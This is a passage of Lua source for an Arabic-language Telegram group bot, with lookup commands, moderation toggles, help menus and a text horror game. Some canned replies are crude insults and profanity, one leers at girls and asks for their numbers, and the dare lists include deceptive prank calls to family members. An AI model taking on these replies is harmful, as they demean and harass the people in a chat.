database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n ◉قائمه الزخرفه \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\nاضغط علي الاسم ليتم نسخه\n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•ٴ\n ◉ ❲[『𝙰𝚕𝚏𝚊』](t.me/so_alfaa )❳ ◉ ')
end

if text == "تعطيل معاني الاسماء" and Manager(msg) then
send(msg.chat_id_, msg.id_, '⋆ ⇽ تم تعطيل معاني الاسماء')
database:set(bot_id.."boyka:Name_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل معاني الاسماء" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⋆ ⇽ تم تفعيل معاني الاسماء')
database:set(bot_id.."boyka:Name_Bots"..msg.chat_id_,"open")
end
if text and text:match("^معني (.*)$") and database:get(bot_id.."boyka:Name_Bots"..msg.chat_id_) == "open" then
local TextName = text:match("^معني (.*)$")
gk = https.request('http://sonicx.ml/Api/Name.php?Name='..URL.escape(TextName)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_,br.meaning)
end

if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '◉ تم تعطيل الابراج')
database:set(bot_id.." sofi:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'◉ تم تفعيل الابراج')
database:set(bot_id.." sofi:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." sofi:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://rudi-dev.tk/Amir2/Boyka.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "تعطيل الاله حاسبه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '◉ تم تعطيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل الاله حاسبه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '◉ تم تعطيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الاله حاسبه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'◉ تم تفعيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." sofi:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://rudi-dev.tk/Amir3/Boyka.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "بتحبو" or text == "بتحب دا" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"طبعا دا قلبي ♥🙄"," هحب فيه اي دا😹🙂","تؤ محصلش😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بتكره دا" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لا دا كلب ميتحبش","ولا بطيقه اصلا","اقل من اني افكر فيه"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شو رائيك" or text == "اي رائيك" or text == "رائيك" then
local texting = {"܁•قلبي اوي دا 🦄💞","܁•   كيوت فشخخخ 🥺💞","܁•اكتر شخص بحبه🥺💞","متوحد 😹💞.","܁•   قلبي دا اوعا حد يكلمو 😚💌"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "رد عليه يابوت" or text == "رد عليه" or text == "رد يابوت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولد ولا بنت 🤓"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "عقاب" or text == "قول عقاب" or text == "العقاب" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"قل لواحد ماتعرفه عطني كف 🧸","🧸سو مشهد تمثيلي عن مصرية بتولد","🧸صور اي شيء يطلبه منك الاعبين","🧸البس طرحه امك او اختك ","🧸لا خلاص معتش في سمحتك"," 🧸اتصل لاخوك و قول له انك سويت حادث و الخ....","🧸تكلم باللغة الانجليزية الين يجي دورك مرة ثانية لازم تتكلم اذا ما تكلمت تنفذ عقاب ثاني","🧸تروح عند شخص تقول له ","🧸 اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....","🧸اتصل على امك و قول لها انك ","🧸اذا انت ولد اكسر اغلى او احسن عطور عندك اذا انتي بنت اكسري الروج حقك او الميك اب حقك"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "بنت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اي ي جامده تعي بف هاتي رقمك وهكلمك بليل ي وتكه انتي هاتي بوسه💋😉","اي ي جامده متجبي بوسه ولا اقولك هاتي رقمك اكلمك واتس واخلي بابا يتجوزك😉💋🤸‍♂","ي بت كلمي بابا عايزك بف وابعتي رقمك ها بابا بيحبك 💋❤️🤍🤸‍♂🤸‍♂😉","يعم دي اقل من اني اديها رقمي 😎😜"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تفعيل مريم"  then
if Constructor(msg) then  
database:set(bot_id.."my_maryam:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"◉ تـم تـفعـيل مريم") 
return false  
end
end

if text == "تعطيل مريم"  then
if Constructor(msg) then  
database:del(bot_id.."my_maryam:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"◉ تـم تـعـطـيل مريم") 
return false end
end
if text == "مريم" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"◉ مريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"هل انت جاهز ؟😈 ❲لو هتكمل ارسل يلا❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "يلا" or text == "هيا بنا"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" ؟لا تصدر اي صوت ! 😈 ❲لو هتكمل ارسال حاضر ❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "ماشي" or text == "حاضر"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" لقد وصلنا الى المنزل شكراَ جزيلَ انتطرني ثواني وسوف اعود! 😈 ❲لو هتكمل ارسال مستني ❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مستني" or text == "منتظر"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" لقد عودت إليك ظهر شيئ 😈 ❲لو هتكمل إرسال احد ما خرج من المنزل! 😈❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "احد ما خرج من المنزل! 😈" or text == "احد ما خرج من المنزل"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"هيا نذهب داخل المنزل😈 ❲لو هتكمل ارسال هيا❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هيا"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" نحنو نتوه في هذه المكان😈❲لو هتكمل ارسال تعالي نذهب الي الضوء❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تعالي نذهب الي الضوء"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"❲لو هتكمل ارسل ياالهي كان هناك❳ 😈لايوجد ضوء هناك انظر"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "ياالهي كان هناك" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"تع نذهب الي الباب الرئيسي😈 ❲لو هتكمل ارسل انهو مغلق❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "انهو مغلق" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"انها النهايه  ❲هتكمل ولا لا❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هكمل" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"سارسل اليك اختيارت لو حليت صح ستنجو من العقاب لو خطأ سيقوم عليك العقاب😈❲عدد يقبل القسمة على 2,3,4,5,6 وعند القسمة في كل مرة يتبقى واحد، ما هو العدد؟❳❲61،44,00,121,90،99,70❳"}

send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "لا" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"هي انت ستندم سأقتلك😈"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "61" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لقد فازت ونجوت من العقاب 👻🌟"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "99" or text == "70" or text == "44" or text == "00" or text == "121" or text == "90" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"قل لواحد ماتعرفه عطني كف خطأ العقاب هوا ؟؟","خطأ العقاب هوا ؟؟سو مشهد تمثيلي عن مصرية بتولد","خطأ العقاب هوا ؟؟صور اي شيء يطلبه منك الاعبين","خطأ العقاب هوا ؟؟البس طرحه امك او اختك ","خطأ العقاب هوا ؟؟لا خلاص معتش في سمحتك"," خطأ العقاب هوا ؟؟اتصل لاخوك و قول له انك سويت حادث و الخ....","خطأ العقاب هوا ؟؟تكلم باللغة الانجليزية الين يجي دورك مرة ثانية لازم تتكلم اذا ما تكلمت تنفذ عقاب ثاني","خطأ العقاب هوا ؟؟تروح عند شخص تقول له ","خطأ العقاب هوا ؟؟ اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....","خطأ العقاب هوا ؟؟اتصل على امك و قول لها انك ","خطأ العقاب هوا ؟؟اذا انت ولد اكسر اغلى او احسن عطور عندك اذا انتي بنت اكسري الروج حقك او الميك اب حقك"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "ولد" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دا عيل بيضااان","ولا بطيقه اصلا","اقل من اني افكر فيه","كسمو مش حوار"," ظريط سيببك منو"," يعم دا حكاك هتعمل عقلك بي","يابا دا اقل من انك ترد عليه","فكك منه م يستاهلش","احظره واريخ دماغي؟!!"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "اشتمها" or text == "اشتمه" then
local texting = {" مبهينش حيوانات😂😂","ايه يخول انت مزعلو ليه","لو جيت جمبه هزعلك مني فل!! ","عايز اي متوحد انت","سيبك منو دا متخلف 😂💔","ده واطى وندلل فكك منو 😂💔","دا جربان اهين مين??😂😂😂 😂💔"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "بوسها" or text == "بوسه" then
local texting = {"امووووووووواحح😘💕","استغفر الله فاسق 😒","الوجه ميساعد 😐✋","ببوس حريم بس😌😹","خدك نضيف!؟ 😂","تدفع كام! 🌝","طب خليه يستحمي اول 🙊😂","كل شويه بوسه بوسه 😏","مش بايس حد انا فل!! ","امموووواه لعيونك ي جميل 💎💗😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == 'تفعيل الردود' and Manager(msg) then   
database:del(bot_id..'lock:reply'..msg.chat_id_)  
Text = ' ◉ تم تفعيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' and Manager(msg) then  
database:set(bot_id..'lock:reply'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'رابط مسح' or text == 'رابط المسح' or text == 'بوت مسح' or text == 'بوت المسح' then  
local Text = [[  
رابط مسح جميع موقع التواصل 
امسح بقي عشان ونبي زهقت منك  
]]  
keyboard = {}  
keyboard.inline_keyboard = {  
{{text = 'Telegram',url="https://my.telegram.org/auth?to=delete"},{text = 'BOT Telegram', url="t.me/LC6BOT"}},  
{{text = 'instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},  
{{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}},  
{{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
end
if text and text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
------------------------------------------------------------------------
if text == "صلاحياتي" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
------------------------------------------------------------
------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------
if text and text:match('^صلاحياته @(.*)') then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"- المعرف غير صحيح \n*")   
return false  end   

Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg 
--------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
if Text == '/help1' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ اكتب الامر الذي تريد تنفيذه..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه ◉', callback_data=data.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه ◉', callback_data=data.sender_user_id_.."/unlockjoine"},
},
{
{text = 'قفل الدردشه ◉', callback_data=data.sender_user_id_.."/lock:text"},{text = 'فتح الدردشه ◉', callback_data=data.sender_user_id_.."/unlockchat"},
},
{
{text = 'قفل الدخول ◉', callback_data=data.sender_user_id_.."/lock_joine"},{text = 'فتح الدخول ◉', callback_data=data.sender_user_id_.."/unlock_joine"},
},
{
{text = 'قفل البوتات ◉', callback_data=data.sender_user_id_.."/lockbots"},{text = 'فتح البوتات ◉', callback_data=data.sender_user_id_.."/unlockbots"},
},
{
{text = 'قفل الاشعارات ◉', callback_data=data.sender_user_id_.."/locktags"},{text = 'فتح الاشعارات ◉', callback_data=data.sender_user_id_.."/unlocktags"},
},
{
{text = 'قفل التعديل ◉', callback_data=data.sender_user_id_.."/lockedit"},{text = 'فتح التعديل ◉', callback_data=data.sender_user_id_.."/unlockedit"},
},
{
{text = 'قفل الروابط ◉', callback_data=data.sender_user_id_.."/locklink"},{text = 'فتح الروابط ◉', callback_data=data.sender_user_id_.."/unlocklink"},
},
{
{text = 'قفل المعرفات ◉', callback_data=data.sender_user_id_.."/lockusername"},{text = 'فتح المعرفات ◉', callback_data=data.sender_user_id_.."/unlockusername"},
},
{
{text = 'قفل التاك ◉', callback_data=data.sender_user_id_.."/locktag"},{text = 'فتح التاك ◉', callback_data=data.sender_user_id_.."/unlocktag"},
},
{
{text = 'قفل الملصقات ◉', callback_data=data.sender_user_id_.."/locksticar"},{text = 'فتح الملصقات ◉', callback_data=data.sender_user_id_.."/unlocksticar"},
},
{
{text = 'قفل المتحركه ◉', callback_data=data.sender_user_id_.."/lockgif"},{text = 'فتح المتحركه ◉', callback_data=data.sender_user_id_.."/unlockgif"},
},
{
{text = 'قفل الفيديو ◉', callback_data=data.sender_user_id_.."/lockvideo"},{text = 'فتح الفيديو ◉', callback_data=data.sender_user_id_.."/unlockvideo"},
},
{
{text = 'قفل الصور ◉', callback_data=data.sender_user_id_.."/lockphoto"},{text = 'فتح الصور ◉', callback_data=data.sender_user_id_.."/unlockphoto"},
},
{
{text = 'قفل الاغاني ◉', callback_data=data.sender_user_id_.."/lockvoise"},{text = 'فتح الاغاني ◉', callback_data=data.sender_user_id_.."/unlockvoise"},
},
{
{text = 'قفل الصوت ◉', callback_data=data.sender_user_id_.."/lockaudo"},{text = 'فتح الصوت ◉', callback_data=data.sender_user_id_.."/unlockaudo"},
},
{
{text = 'قفل التوجيه ◉', callback_data=data.sender_user_id_.."/lockfwd"},{text = 'فتح التوجيه ◉', callback_data=data.sender_user_id_.."/unlockfwd"},
},
{
{text = 'قفل الملفات ◉', callback_data=data.sender_user_id_.."/lockfile"},{text = 'فتح الملفات ◉', callback_data=data.sender_user_id_.."/unlockfile"},
},
{
{text = 'قفل الجهات ◉', callback_data=data.sender_user_id_.."/lockphone"},{text = 'فتح الجهات ◉', callback_data=data.sender_user_id_.."/unlockphone"},
},
{
{text = 'قفل الكلايش ◉', callback_data=data.sender_user_id_.."/lockposts"},{text = 'فتح الكلايش ◉', callback_data=data.sender_user_id_.."/unlockposts"},
},
{
{text = 'قفل التكرار ◉', callback_data=data.sender_user_id_.."/lockflood"},{text = 'فتح التكرار ◉', callback_data=data.sender_user_id_.."/unlockflood"},
},
{
{text = 'قفل الفارسيه ◉', callback_data=data.sender_user_id_.."/lockfarse"},{text = 'فتح الفارسيه ◉', callback_data=data.sender_user_id_.."/unlockfarse"},
},
{
{text = 'قفل السب ◉', callback_data=data.sender_user_id_.."/lockfshar"},{text = 'فتح السب ◉', callback_data=data.sender_user_id_.."/unlockfshar"},
},
{
{text = 'قفل الانجليزيه ◉', callback_data=data.sender_user_id_.."/lockenglish"},{text = 'فتح الانجليزيه ◉', callback_data=data.sender_user_id_.."/unlockenglish"},
},
{
{text = 'قفل الانلاين ◉', callback_data=data.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين ◉', callback_data=data.sender_user_id_.."/unlockinlene"},
},
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help2' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ اكتب الامر الذي تريد تنفيذه..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعطيل التنزيل ◉', callback_data=data.sender_user_id_.."/lockdul"},{text = 'تفعيل التنزيل ◉', callback_data=data.sender_user_id_.."/unlockdul"},
},
{
{text = 'تعطيل الرابط ◉', callback_data=data.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط ◉', callback_data=data.sender_user_id_.."/unlock_links"},
},
{
{text = 'تعطيل الترحيب ◉', callback_data=data.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب ◉', callback_data=data.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'تعطيل الردود العامه ◉', callback_data=data.sender_user_id_.."/lockrepall"},{text = 'تفعيل الردود العامه ◉', callback_data=data.sender_user_id_.."/unlockrepall"},
},
{
{text = 'تعطيل الايدي ◉', callback_data=data.sender_user_id_.."/lockide"},{text = 'تفعيل الايدي ◉', callback_data=data.sender_user_id_.."/unlockide"},
},
{
{text = 'تعطيل الايدي بالصوره ◉', callback_data=data.sender_user_id_.."/lockidephoto"},{text = 'تفعيل الايدي بالصوره ◉', callback_data=data.sender_user_id_.."/unlockidephoto"},
},
{
{text = 'تعطيل الحظر ◉', callback_data=data.sender_user_id_.."/lockkiked"},{text = 'تفعيل الحظر ◉', callback_data=data.sender_user_id_.."/unlockkiked"},
},
{
{text = 'تعطيل الرفع ◉', callback_data=data.sender_user_id_.."/locksetm"},{text = 'تفعيل الرفع ◉', callback_data=data.sender_user_id_.."/unlocksetm"},
},
{
{text = 'تعطيل اطردني ◉', callback_data=data.sender_user_id_.."/lockkikedme"},{text = 'تفعيل اطردني ◉', callback_data=data.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'تعطيل الالعاب ◉', callback_data=data.sender_user_id_.."/lockgames"},{text = 'تفعيل الالعاب ◉', callback_data=data.sender_user_id_.."/unlockgames"},
},
{
{text = 'تعطيل الردود ◉', callback_data=data.sender_user_id_.."/lockrepgr"},{text = 'تفعيل الردود ◉', callback_data=data.sender_user_id_.."/unlockrepgr"},
},
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help3' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..??♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قائمة اوامر الحماية..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ قـفـل او فـتـح + الامــر.
◉ قفل او فتح الامر بالتقييد.
◉ قفل او فتح الامر بالـطرد.
◉ قـفل او فتح الامر بالكتم.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ الـروابـط. 
◉ المعرفات.
◉ الشاررحه.
◉ التـعديل.
◉ التـثبيت.
◉ المتحركه.
◉ المـلفات.
◉ الـصـور.
◉ الـتـاك.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ المـلصقات.
◉ الاشعارات.
◉ الـدردشه.
◉ الفـيديو.
◉ لاننلاين.
◉ التوجيه.
◉ الاغاني.
◉ الصوت.
◉ الجهات.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ المـاركداون.
◉ الكـلايش.
◉ الممنوعه.
◉ السيلفي.
◉ البوتات.
◉ التكرار.
◉ السب.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help4' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قائمة اوامر الادمنية..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع او تنزيل مميز.
◉ عدد الجروب.
◉ الغاء تقـييد.
◉ المحظورين.
◉ المـكتومين.
◉ الصتلاحيات.
◉ قائمه الـمنع.
◉ الغاء حظر.
◉ تاك للكل.
◉ الغاء كتم.
◉ الغاء منع.
◉ المميزين.
◉ تقييد.
◉ كـتـم.
◉ حـظر.
◉ طـرد.
◉ مـنع.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ الغاء تثـبيت.
◉ تـثـبـيـت.
◉ الاعدادات.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ الرابط.
◉ القوانين.
◉ الترحيب.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ تفعيل او تعطيل الترحيب.↑↓
◉ اضف او مسح صلاحيه.↑↓
◉ وضع تكرار + العدد.↑↓
◉ كشف البوتات.↑↓
◉ ايـدي.
◉ جهـاتي.
◉ رسائـلي.
◉ سحكاتي.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ وضع + الاوامر الادناه..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ اسـم.
◉ رابـط.
◉ صـوره.
◉ وصـف.
◉ قـوانين.
◉ ترحـيب.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ مسح + الاوامر الادناه..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ قائمه المـنع.
◉ الصـلاحيات.
◉ المـحظورين.
◉ المـكتومين.
◉ المطرودين.
◉ الممـيزين.
◉ القـوانين.
◉ البـوتات.
◉ الصـوره.
◉ الرابـط.
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
